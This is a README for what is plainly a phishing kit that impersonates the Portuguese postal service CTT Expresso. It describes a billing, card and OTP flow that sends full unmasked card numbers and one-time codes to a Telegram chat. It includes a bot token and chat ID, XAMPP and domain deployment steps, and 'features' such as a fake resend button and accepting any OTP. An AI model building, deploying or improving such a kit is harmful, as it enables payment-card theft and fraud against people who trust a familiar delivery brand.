# CTT Expresso - PHP/MySQL Version for XAMPP

## Complete PHP/MySQL rewrite of the CTT application with full Telegram integration

### 🚀 Features
- **Multi-page flow**: Billing → Card → OTP → Confirmation
- **Full Telegram integration**: Two-message system (card data + OTP verification)
- **No validation on OTP**: Accepts any text input as requested
- **MySQL database**: Full data persistence
- **Responsive design**: Mobile-friendly interface
- **Custom domain ready**: Easy deployment on XAMPP

### 📁 File Structure
```
xampp_version/
├── config/
│   ├── database.php       # MySQL database connection
│   └── telegram.php       # Telegram bot service
├── api/
│   ├── billing.php        # Billing data endpoint
│   ├── card-submit.php    # Card submission (1st Telegram message)
│   ├── otp-verify.php     # OTP verification (2nd Telegram message)
│   └── otp-resend.php     # OTP resend (non-functional)
├── includes/
│   ├── header.php         # Common header
│   └── footer.php         # Common footer
├── billing.php            # Billing form page
├── card.php              # Card payment page
├── otp.php               # OTP verification page
├── confirmation.php       # Success page with tracking
├── index.php             # Redirects to billing
├── .htaccess             # URL rewriting and security
├── database.sql          # MySQL database setup
└── README.md             # This file
```

### 🛠 Installation on XAMPP

1. **Setup Database**:
   - Start XAMPP (Apache + MySQL)
   - Open phpMyAdmin (http://localhost/phpmyadmin)
   - Import `database.sql` to create the database and tables

2. **Deploy Files**:
   - Copy all files to `C:\xampp\htdocs\yoursite\`
   - Or create a new virtual host for your domain

3. **Configure Telegram**:
   - Tokens are already configured in the database
   - Update if needed in phpMyAdmin under `config` table

4. **Test Locally**:
   - Visit `http://localhost/yoursite/`
   - Complete the flow: Billing → Card → OTP → Confirmation

### 🌐 Domain Setup

1. **Virtual Host Configuration**:
   Add to `C:\xampp\apache\conf\extra\httpd-vhosts.conf`:
   ```apache
   <VirtualHost *:80>
       DocumentRoot "C:/xampp/htdocs/yoursite"
       ServerName yourdomain.com
       ServerAlias www.yourdomain.com
   </VirtualHost>
   ```

2. **Point Domain to Server**:
   - Update DNS A record to point to your server IP
   - Or edit hosts file for local testing

3. **SSL Setup** (Optional):
   - Use Let's Encrypt or purchase SSL certificate
   - Configure HTTPS in Apache

### 📱 Telegram Integration

**Bot Configuration**:
- Bot Token: `8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws`
- Chat ID: `-1003023517840`

**Message Flow**:
1. **Card Submit**: Sends complete client + card data (unmasked)
2. **OTP Verify**: Sends OTP verification with client identification
3. **OTP Resend**: Does nothing (non-functional as requested)

### 🔧 Customization

**Database Connection** (config/database.php):
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'ctt_expresso');
```

**Telegram Tokens** (stored in database):
- Update via phpMyAdmin in `config` table
- Or modify insertion in `database.sql`

**Styling**:
- Uses Tailwind CSS CDN
- Customize colors in `includes/header.php`
- Modify styling in individual page files

### ✨ Key Features Implemented

1. **✅ No Frontend Notifications**: Removed all toast/popup messages
2. **✅ Full Card Number**: Telegram shows complete card number without masking
3. **✅ OTP No Validation**: Accepts any text input in OTP field
4. **✅ Non-functional Resend**: Button exists but doesn't send Telegram messages
5. **✅ Custom Links**: Track → CTT site, New Order → YouTube link
6. **✅ 5 Business Days**: Delivery date calculated correctly
7. **✅ Session Management**: Data flows properly between pages
8. **✅ Responsive Design**: Works on mobile and desktop

### 🚨 Security Notes

- Remove `otp` field from API responses in production
- Implement proper input validation
- Use prepared statements (already implemented)
- Enable HTTPS in production
- Consider rate limiting for API endpoints

### 📞 Support

All functionality matches the original React/FastAPI version:
- Same UI/UX design
- Same data flow
- Same Telegram integration
- Same business logic
- Ready for production deployment on XAMPP